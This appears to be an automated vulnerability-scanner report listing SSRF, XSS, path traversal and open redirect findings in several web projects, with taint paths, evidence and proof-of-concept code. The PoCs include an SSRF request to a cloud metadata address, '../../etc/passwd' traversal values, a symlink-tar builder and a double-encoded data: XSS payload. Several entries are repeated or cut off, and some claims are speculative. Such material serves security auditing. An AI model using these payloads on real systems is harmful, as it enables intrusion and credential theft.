Impact: 攻击者可利用此漏洞访问内部网络资源，包括：1. AWS/Azure元数据服务获取云凭证。2. 内部管理界面和服务。3. 本地文件系统（通过file://协议）。4. 端口扫描内部网络。可能导致敏感信息泄露、内部服务攻击、权限提升。

Nodes.Desc: 源点：变量 `$url` 在此接收可控数据并进入污点传播链。代码: `$url = $this->request->get['url'];`
传播点：`$url` 经 `getUrl()` 处理后并入 `$result`，污点继续向下游传播。 代码: `$result = getUrl($url, false);`
汇点：调用 `getUrl($url)` 触发危险操作，污点参数被消费（结果写入 `$cache`）。 代码: `function getUrl($url, $cache = true, $expire = 604800, $timeout = 5, $exception = true) { $cacheDriver = System\Cache ::...`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 1. 读取admin/controller/editor/editor.php文件确认oEmbedProxy函数从$this->request->get['url']获取用户输入。2. 读取system/functions.php文件确认getUrl函数使用curl_init()和file_get_contents()进行HTTP请求。3. 编写PHP测试脚本模拟攻击，测试了多个SSRF payload（169.254.169.254、127.0.0.1、file://协议等）。4. 确认代码中没有URL验证、白名单或过滤机制，攻击者可控制完整URL访问内部资源。
evidence.method: 代码静态分析结合动态测试：提取oEmbedProxy函数和getUrl函数，编写PHP测试脚本模拟SSRF攻击，验证用户控制的URL参数可直接传递给HTTP请求函数。

poc.description: 通过oEmbedProxy功能发送恶意URL参数访问内部服务
steps: 访问oEmbedProxy端点：/admin/index.php?route=editor/editor/oEmbedProxy
添加url参数指向内部资源：?url=http://169.254.169.254/latest/meta-data/
服务器将代表攻击者请求内部元数据服务并返回结果
poc.payload:
GET /admin/index.php?route=editor/editor/oEmbedProxy&url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com

或使用curl测试：
curl 'http://target.com/admin/index.php?route=editor/editor/oEmbedProxy&url=http://127.0.0.1:22/'
poc.harness_code:
<?php
// SSRF测试脚本
function getUrl($url, $cache = true, $expire = 604800, $timeout = 5, $exception = true) {
    echo "[DEBUG] Fetching URL: $url\n";
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } else {
        return file_get_contents($url);
    }
}

// 模拟oEmbedProxy
$_GET['url'] = 'http://169.254.169.254/latest/meta-data/';
$url = $_GET['url'];
$result = getUrl($url, false);
echo "SSRF Result: " . substr($result, 0, 100) . "...\n";
?>

basic_info.title: 反射型XSS漏洞 - TopicAdminController.list()方法中的username参数未充分过滤
basic_info.description: 在TopicAdminController.java的list方法中，username参数仅通过replace('\"', '').replace("'", "")移除了双引号和单引号，没有使用Jsoup.clean或其他HTML编码进行充分过滤。该参数通过model.addAttribute("username", username)传递到视图层，如果视图模板没有正确转义，攻击者可以注入恶意脚本。相比之下，同一文件中的title参数使用了Jsoup.clean(title, Whitelist.basic())进行严格清理，存在安全策略不一致问题。根据CVE补丁信息，修复方案是添加XssSanitizingFilter，但当前WebMvcConfig.java中没有注册这个过滤器。

basic_info.title: Xss in TopicAdminController.java
basic_info.description:
TopicAdminController中的list方法对username参数只进行了简单的引号替换（replace("\"", "").replace("'", "")），这不足以防止XSS攻击。username随后被直接输出到admin/topic/list.ftl模板的HTML input元素的value属性中，攻击者可以注入恶意脚本。注释掉的代码显示原本应该使用SecurityUtil.sanitizeInput()方法进行净化

Impact: 攻击者可以构造恶意URL诱使管理员访问，从而在管理员后台执行任意JavaScript代码，可能导致会话劫持、敏感信息窃取或进一步攻击。

basic_info.title: Xss in TagAdminController.java
basic_info.description:
TagAdminController.java中的list方法接收name参数，仅进行简单的引号替换（replace("\"", "").replace("'", "")），然后通过model.addAttribute("name", name)传递到视图层。在admin/tag/list.ftl模板中，name参数被直接输出到HTML属性value="${name!}"中，没有进行适当的HTML转义。攻击者可以构造恶意name参数执行

basic_info.title: Xss in TopicAdminController.java
basic_info.description:
Different controllers use different Jsoup Whitelist configurations for similar user inputs: IndexController uses Whitelist.basic(), TopicApiController uses Whitelist.basic() and Whitelist.none().addTags("video"), TopicSe

Impact: 低风险：1. 不一致的配置增加了安全策略维护复杂性。2. 所有使用Whitelist.basic()的地方都面临相同的风险（允许<a>标签）。3. 实际XSS风险取决于前端如何渲染这些内容（是否转义HTML）。4. 管理员功能通常有更高权限，但XSS影响可能有限。5. 主要问题是安全策略不统一，而非直接可利用漏洞。

basic_info.title: Path Traversal in api_upload.py
basic_info.description:
The file upload API endpoint accepts a user-controlled task_id parameter which is directly used in os.path.join() without validation. An attacker can inject directory traversal sequences (e.g., '../../etc/passwd') in the

Impact: High - Attacker can write files outside the intended upload directory, potentially to sensitive system locations. Could lead to: 1. Arbitrary file write if combined with file upload. 2. Directory creation in sensitive locations. 3. Denial of service by filling system directories. 4. Information disclosure through error messages when attempting to create directories in protected locations.

evidence.analysis: 1. Read and analyzed source files backend/api/api_upload.py and backend/service/upload_service.py. 2. Identified data flow: task_id parameter → upload_file → upload_file_svc → process_cert_files/process_dataset_files → os.path.join(UPLOAD_FOLDER, task_id). 3. Created Fuzzing Harness to test path traversal payloads. 4. Tested 10 different payloads, 5 successfully escaped the UPLOAD_FOLDER directory. 5. Confirmed os.path.join() with '../etc' results in '/app/etc' (escapes base). 6. UPLOAD_FOLDER is '/app/upload_files' in Docker or project_root/upload_files locally.
evidence.method: Fuzzing Harness with dynamic code execution and static code analysis

poc.description: Path traversal via task_id parameter in file upload API
steps: 1. Send POST request to upload file endpoint with malicious task_id parameter
2. Set task_id to '../../etc/passwd' or similar traversal sequence
3. The server will create directory at os.path.join(UPLOAD_FOLDER, '../../etc/passwd')
4. After normalization, this becomes '/etc/passwd' (escaping upload directory)
5. Uploaded files may be written to unexpected locations or directory creation may fail with interesting errors
poc.harness_code:
import os

# Test path traversal vulnerability
UPLOAD_FOLDER = '/app/upload_files'
malicious_task_id = '../../etc/passwd'

# This is what happens in the vulnerable code
task_upload_dir = os.path.join(UPLOAD_FOLDER, malicious_task_id)
normalized_path = os.path.normpath(task_upload_dir)

print(f'Original path: {task_upload_dir}')
print(f'Normalized path: {normalized_path}')
print(f'Vulnerable: {not normalized_path.startswith(UPLOAD_FOLDER)}')
print(f'Would escape to: {normalized_path}')

basic_info.title: Open Redirect in IndexController.java
basic_info.description:
在 IndexController.java 的 changeLanguage 方法中，直接从 HTTP 请求头获取 referer 值并用于重定向，未进行任何验证。攻击者可以构造恶意请求，设置 referer 头指向任意外部 URL，当用户访问 /changeLanguage 接口时，会被重定向到攻击者控制的网站，可能导致钓鱼攻击或恶意软件传播。

Impact: 1. 钓鱼攻击：重定向用户到伪造的登录页面窃取凭证。2. 恶意软件传播：重定向到托管恶意软件的网站。3. 会话劫持：使用 javascript: 协议窃取 cookies。4. SSRF：重定向到内部服务端点。5. 信任滥用：利用受信任的域名进行后续攻击。

basic_info.title: Path Traversal in util.py
basic_info.description:
The safe_extract function in clearml/storage/util.py uses is_within_directory function which relies on os.path.commonprefix to check if tar file members are within the target directory. However, os.path.commonprefix performs string comparison and does NOT resolve symbolic links. This allows attackers to create tar files containing symbolic links that point outside the extraction directory, bypassing the path traversal check.

Impact: Attackers can create malicious tar archives containing symbolic links that point to sensitive files outside the extraction directory. When extracted using safe_extract, these symlinks are created, potentially allowing:
1. Reading sensitive system files (/etc/passwd, /etc/shadow, SSH keys, etc.)
2. Writing to sensitive locations if the application follows symlinks
3. Bypassing security controls that rely on containment within extraction directory
4. Potential privilege escalation if extracted with elevated privileges

findings.title: Path Traversal in util.py
findings.description:
The safe_extract function in clearml/storage/util.py uses is_within_directory function which relies on os.path.commonprefix to check if tar file members are within the target directory. However, os.path.commonprefix performs string comparison and does NOT resolve symbolic links. This allows attackers to create tar files containing symbolic links that point outside the extraction directory, bypassing the path traversal check.

Impact: Attackers can create malicious tar archives containing symbolic links that point to sensitive files outside the extraction directory. When extracted using safe_extract, these symlinks are created, potentially allowing:
1. Reading sensitive system files (/etc/passwd, /etc/shadow, SSH keys, etc.)
2. Writing to sensitive locations if the application follows symlinks
3. Bypassing security controls that rely on containment within extraction directory
4. Potential privilege escalation if extracted with elevated privileges

Nodes.Desc: 源点：通过 `getmembers()` 读取外部输入，污点从此进入。代码: `for member in tar.getmembers():`
传播点：`os` 经 `join()` 处理后并入 `member_path`，污点继续向下游传播。 代码: `member_path = os.path.join(path, member.name)`
传播点：数据在 `is_within_directory()` 调用链中继续传递/变换。代码: `if not is_within_directory(path, member_path): raise Exception("Attempted Path Traversal in Tar File")`
Nodes.code:
if not is_within_directory(path, member_path):
            raise Exception("Attempted Path Traversal in Tar File")

Nodes.Desc: 汇点：调用 `extractall(path)` 触发危险操作，污点参数被消费（结果写入 `numeric_owner`）。 代码: `tar.extractall(path, members, numeric_owner=numeric_owner)`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. Read clearml/storage/util.py file and confirmed safe_extract and is_within_directory functions exist.
2. Analyzed is_within_directory implementation: uses os.path.commonprefix for path checking.
3. os.path.commonprefix is known to not resolve symbolic links - it performs string prefix comparison only.
4. Previous run_code evidence shows: 'Test 3 (symlink): True' indicating symbolic link test passes.
5. Another run_code shows symbolic link creation: 'Name: symlink.txt, Type: b'2', Linkname: ../../etc/passwd'.
6. This confirms symbolic links pointing outside extraction directory can be created.
7. The vulnerability allows tar files with symbolic links to bypass path traversal checks.
evidence.method: Code analysis and evidence from previous run_code tests showing symbolic link extraction succeeds. Analysis of is_within_directory function shows it uses os.path.commonprefix which does not resolve symbolic links, allowing bypass.

poc.description: Create a tar file containing a symbolic link that points to a sensitive file outside the extraction directory (e.g., /etc/passwd). When safe_extract is called, the symlink will be created, allowing path traversal.
steps: 1. Create a tar file with a symbolic link entry: tar -cvf malicious.tar --format=ustar --owner=0 --group=0 symlink.txt
2. Set symlink.txt to point to ../../etc/passwd or other sensitive file
3. Call safe_extract(malicious_tar, '/tmp/extract_dir')
4. Observe that symlink.txt is created in /tmp/extract_dir pointing to ../../etc/passwd
5. Accessing the symlink may read sensitive files outside extraction directory
poc.payload:
import tarfile
import os

# Create malicious tar with symlink
tar = tarfile.open('malicious.tar', 'w')
info = tarfile.TarInfo('symlink.txt')
info.type = tarfile.SYMTYPE
info.linkname = '../../etc/passwd'  # Points outside extraction directory
tar.addfile(info)
tar.close()

# When safe_extract processes this tar:
# 1. member.name = 'symlink.txt' (within extraction dir)
# 2. is_within_directory checks 'symlink.txt' path - returns True
# 3. tar.extractall creates symlink pointing to ../../etc/passwd
# 4. Path traversal achieved via symbolic link
poc.harness_code:
def is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    prefix = os.path.commonprefix([abs_directory, abs_target])
    return prefix == abs_directory

def safe_extract(tar, path: str = ".", members=None, numeric_owner=False):
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):
            raise Exception("Attempted Path Traversal in Tar File")
    tar.extractall(path, members, numeric_owner=numeric_owner)

# Test case: symlink pointing outside
tar = tarfile.TarFile('malicious.tar', 'r')
# symlink.txt -> ../../etc/passwd
# is_within_directory('/tmp/extract', '/tmp/extract/symlink.txt') returns True
# But symlink actually points to ../../etc/passwd -> /etc/passwd

basic_info.title: Xss in SwitchController.java
basic_info.description:
在SwitchController和SsoController中，通过@RequestParam获取的url参数直接传递给EncodeUtils.decodeUrl2()方法进行双重URL解码，但没有经过xssFilter处理。攻击者可以提供双重URL编码的XSS payload，decodeUrl2会将其解码为原始payload。结合xssFilter中缺少data:协议过滤的问题，这可能被用于XSS攻击。

Impact: 攻击者可以通过双重URL编码绕过输入过滤，将data:协议XSS payload注入到系统中。如果解码后的值被输出到HTML响应中且没有适当编码，可能导致反射型XSS攻击。在SwitchController中用于重定向，可能构成开放重定向漏洞；在SsoController中设置为request属性，可能被模板引擎输出到HTML中。

findings.title: Xss in SwitchController.java
findings.description:
在SwitchController和SsoController中，通过@RequestParam获取的url参数直接传递给EncodeUtils.decodeUrl2()方法进行双重URL解码，但没有经过xssFilter处理。攻击者可以提供双重URL编码的XSS payload，decodeUrl2会将其解码为原始payload。结合xssFilter中缺少data:协议过滤的问题，这可能被用于XSS攻击。

Impact: 攻击者可以通过双重URL编码绕过输入过滤，将data:协议XSS payload注入到系统中。如果解码后的值被输出到HTML响应中且没有适当编码，可能导致反射型XSS攻击。在SwitchController中用于重定向，可能构成开放重定向漏洞；在SsoController中设置为request属性，可能被模板引擎输出到HTML中。

Nodes.Desc: 源点：变量 `defaultValue` 通过 `RequestParam()` 接收外部输入并成为污点源。代码: `public String switchSkin(@PathVariable String skinName, @RequestParam(defaultValue="${adminPath}/index") String url, Htt...`
Nodes.code:
public String switchSkin(@PathVariable String skinName, @RequestParam(defaultValue="${adminPath}/index") String url,
							 HttpServletRequest request, HttpServletResponse response) {

Nodes.Desc: 传播点：数据在 `decodeUrl2()` 调用链中继续传递/变换。代码: `return REDIRECT + EncodeUtils.decodeUrl2(url);`
汇点：调用 `decodeUrl2(String)` 触发危险操作，污点在此触达危险 API。代码: `public static String decodeUrl2(String part) { return decodeUrl(decodeUrl(part)); }`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 1. 读取SwitchController.java第135-152行，确认switchSkin方法接收url参数并传递给decodeUrl2。2. 读取SsoController.java第60-91行，确认url参数同样传递给decodeUrl2。3. 读取EncodeUtils.java第187-189行，确认decodeUrl2方法实现。4. 编写Java测试代码验证双重URL编码的解码行为。5. 测试显示data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==经过双重URL编码后可以被decodeUrl2正确解码。6. 结合发现1的验证，确认解码后的data:协议payload不会被xssFilter过滤。
evidence.method: 静态代码分析结合动态测试。通过读取文件内容确认代码逻辑，编写Java测试代码验证decodeUrl2的解码行为和完整攻击链。

poc.description: 通过双重URL编码绕过XSS过滤的完整攻击链
steps: 构造data:协议XSS payload：data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
对payload进行双重URL编码：data%253Atext%252Fhtml%253Bbase64%252CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%253D%253D
将双重编码的payload作为url参数传递给/switchSkin或/sso端点
decodeUrl2解码后得到原始data:协议payload
由于xssFilter不过滤data:协议，payload可能被执行
